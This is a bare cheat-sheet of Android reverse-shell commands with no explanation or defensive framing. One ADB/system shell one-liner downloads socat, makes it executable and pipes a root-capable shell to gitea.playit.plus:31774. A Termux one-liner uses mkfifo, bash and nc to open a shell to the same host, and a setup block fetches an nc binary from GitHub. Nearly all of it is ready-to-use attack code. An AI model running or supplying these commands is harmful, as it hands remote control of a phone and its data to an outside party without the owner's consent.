ADB Shell / System Shell Reverse Shell
```
curl https://raw.githubusercontent.com/bnsmb/binaries-for-Android/refs/heads/main/binaries/socat -o /data/local/tmp/socat && chmod 777 /data/local/tmp/socat && /data/local/tmp/socat exec:'/system/bin/sh',pty,stderr,setsid,sigint,sane tcp:gitea.playit.plus:31774
```

Termux Reverse Shell
```
rm -f /data/data/com.termux/files/usr/tmp/f; mkfifo /data/data/com.termux/files/usr/tmp/f; cat /data/data/com.termux/files/usr/tmp/f | /data/data/com.termux/files/usr/bin/bash -i 2>&1 | toybox nc gitea.playit.plus 31774 > /data/data/com.termux/files/usr/tmp/f
```

```
cd /data/data/com.termux/files/usr/bin && \
pkg update -y && \
pkg upgrade -y -o Dpkg::Options::="--force-confnew" && \
pkg install -y wget gcompat && \
wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/nc && \
chmod 777 ./nc && \
# cd /data/data/com.termux/files/usr/lib && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libbsd.so.0 && \
# chmod 777 ./libbsd.so.0 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libmd.so.0 && \
# chmod 777 ./libmd.so.0 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libc_malloc_debug.so.0 && \
# chmod 777 ./libc_malloc_debug.so.0 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libpthread.so.0 && \
# chmod 777 ./libpthread.so.0 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/ld-linux-aarch64.so.1 && \
# chmod 777 ./ld-linux-aarch64.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libanl.so.1 && \
# chmod 777 ./libanl.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libBrokenLocale.so.1 && \
# chmod 777 ./libBrokenLocale.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libnsl.so.1 && \
# chmod 777 ./libnsl.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/librt.so.1 && \
# chmod 777 ./librt.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libthread_db.so.1 && \
# chmod 777 ./libthread_db.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libutil.so.1 && \
# chmod 777 ./libutil.so.1 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libdl.so.2 && \
# chmod 777 ./libdl.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libnss_compat.so.2 && \
# chmod 777 ./libnss_compat.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libnss_dns.so.2 && \
# chmod 777 ./libnss_dns.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libnss_files.so.2 && \
# chmod 777 ./libnss_files.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libnss_hesiod.so.2 && \
# chmod 777 ./libnss_hesiod.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libresolv.so.2 && \
# chmod 777 ./libresolv.so.2 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libc.so.6 && \
# chmod 777 ./libc.so.6 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libm.so.6 && \
# chmod 777 ./libm.so.6 && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libmemusage.so && \
# chmod 777 ./libmemusage.so && \
# wget https://raw.githubusercontent.com/mastercodeon31415/AndroidBinaries/refs/heads/main/libpcprofile.so && \
# chmod 777 ./libpcprofile.so && \
# cd ../bin && \
# export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib && \
cd /data/data/com.termux/files/home
```

